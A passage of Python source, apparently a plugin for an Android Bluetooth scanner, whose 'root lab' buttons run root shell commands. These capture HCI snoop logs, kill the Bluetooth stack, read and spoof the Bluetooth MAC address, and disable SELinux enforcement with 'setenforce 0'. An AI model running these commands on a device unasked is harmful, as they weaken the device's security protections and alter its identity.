        self.term_lines.append("$ %s%s" % ("[root] " if use_root else "[shell] ", cmd))
        threading.Thread(target=self._term_worker, args=(cmd, use_root), daemon=True).start()

    def term_quick(self, cmd):
        self.term_cmd = cmd
        self.term_run()

    def _term_worker(self, cmd, use_root):
        out = self._exec(cmd, use_root)
        for line in (out or "(empty)").splitlines()[:400]:
            self.term_lines.append(line)
        if len(self.term_lines) > 800:
            self.term_lines = self.term_lines[-800:]
        self.refresh()

    # ==================================================== ROOT LAB (A13)
    def lab_run(self, cmd, tag=""):
        self.llog(("%s " % tag) + cmd)
        threading.Thread(target=self._lab_worker, args=(cmd, tag), daemon=True).start()

    def _lab_worker(self, cmd, tag):
        out = self._exec(cmd, True)
        for line in (out or "(empty)").splitlines()[:60]:
            self.llog("  " + line)
        self.refresh()

    def lab_bt_state(self):
        self.lab_run("cmd bluetooth_manager get-state 2>/dev/null || "
                     "dumpsys bluetooth_manager | grep -m3 -i -E 'state|enabled'", "state")

    def lab_bt_toggle(self):
        self.lab_run("cmd bluetooth_manager disable; sleep 1; "
                     "cmd bluetooth_manager enable; sleep 1; "
                     "cmd bluetooth_manager get-state", "toggle")

    def lab_stack_kill(self):
        self.lab_run("am force-stop com.android.bluetooth; "
                     "killall com.android.bluetooth; echo stack killed", "kill")

    def lab_snoop_on(self):
        self.lab_run("settings put secure bluetooth_hci_log 1; "
                     "setprop persist.bluetooth.btsnooplogmode full; "
                     "getprop persist.bluetooth.btsnooplogmode; "
                     "ls -l /data/misc/bluetooth/logs/", "snoop+")

    def lab_snoop_off(self):
        self.lab_run("settings put secure bluetooth_hci_log 0; "
                     "setprop persist.bluetooth.btsnooplogmode disabled", "snoop-")

    def lab_offload_off(self):
        self.lab_run("setprop persist.bluetooth.a2dp_offload.disabled true; "
                     "settings put global bluetooth_a2dp_offload_disabled 1; "
                     "echo offload off (stack restart required)", "offload-")

    def lab_offload_on(self):
        self.lab_run("setprop persist.bluetooth.a2dp_offload.disabled false; "
                     "settings put global bluetooth_a2dp_offload_disabled 0", "offload+")

    def lab_scan_always(self):
        self.lab_run("settings put global ble_scan_always_enabled 1; "
                     "settings get global ble_scan_always_enabled", "scan-always")

    def lab_props(self):
        self.lab_run("resetprop -p 2>/dev/null | grep -i -E 'blue|bt_|btsnoop' | head -40",
                     "props")

    def lab_btmac(self):
        self.lab_run("getprop ro.boot.btmacaddr; getprop persist.vendor.bt.bdaddr; "
                     "cat /persist/bdaddr.txt 2>/dev/null; "
                     "dumpsys bluetooth_manager | grep -m1 -i address", "btmac")

    def lab_mac_random(self):
        m = "02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5))
        self.lab_run("resetprop -n ro.boot.btmacaddr %s; getprop ro.boot.btmacaddr; "
                     "echo 'a reboot is required for the full effect'" % m, "btmac-rand")

    def lab_selinux_perm(self):
        self.lab_run("getenforce; setenforce 0; getenforce", "selinux")

    def lab_selinux_enforce(self):
        self.lab_run("getenforce; setenforce 1; getenforce", "selinux")

    def lab_tools(self):
        self.tools = _probe_tools(True)
        if self.tools:
            self.llog("found: " + ", ".join("%s=%s" % (k, v)
                                              for k, v in sorted(self.tools.items())))
        else:
            self.llog("tools not found. Options: a Magisk module with BlueZ "
                      "(Bluetooth++ and similar) or static binaries "
                      "in /data/local/tmp (chmod 755).")
        self.refresh()

    def lab_magisk(self):
        self.lab_run("magisk -c; magisk --path; "
                     "ls /data/adb/magisk/ 2>/dev/null | head; "
                     "ls /data/adb/modules/ 2>/dev/null | head -30", "magisk")

    def lab_pull_snoop(self):
        try:
            d = str(self.api.getAndroid().pluginFilesDir())
        except Exception:
            d = "/data/local/tmp"
        self.lab_run("cp /data/misc/bluetooth/logs/btsnoop_hci.log %s/btsnoop_hci.log "
                     "2>/dev/null && ls -l %s/btsnoop_hci.log" % (d, d), "pull")

    def lab_dumpsys(self):
        self.lab_run("dumpsys bluetooth_manager | head -120", "dumpsys")

    def lab_logcat(self):
        self.lab_run("logcat -d -s bt_btif bt_stack BluetoothManagerService | tail -80",
                     "logcat")

    def lab_gd_stack(self):
        self.lab_run("resetprop -p 2>/dev/null | grep -i -E 'gd_stack|gabeldorsche|bt_stack'",
                     "gd")

    # v4.3: name diagnostics
    def lab_names(self):
        rows = ["known names: %d" % len(self.known_names),
                "named devices: %d of %d"
                % (len([d for d in self.devices.values() if _pick_name(d)]),
                   len(self.devices))]
        for mac, nm in list(self.known_names.items())[:30]:
            rows.append("  %s = %s" % (mac, nm))
        for line in rows:
            self.llog(line)
        self.refresh()

    # -------------------------------------------------------------- helpers
    def copy_mac(self):
        mac = (self.selected or {}).get("address")
        if not mac:
            return
        for fn in (lambda: self.api.getAndroid().clipboardSet(mac),
                   lambda: self.api.copyToClipboard(mac)):
            try:
                fn()
                self.log("Copied: %s" % mac)
                return
            except Exception:
                pass

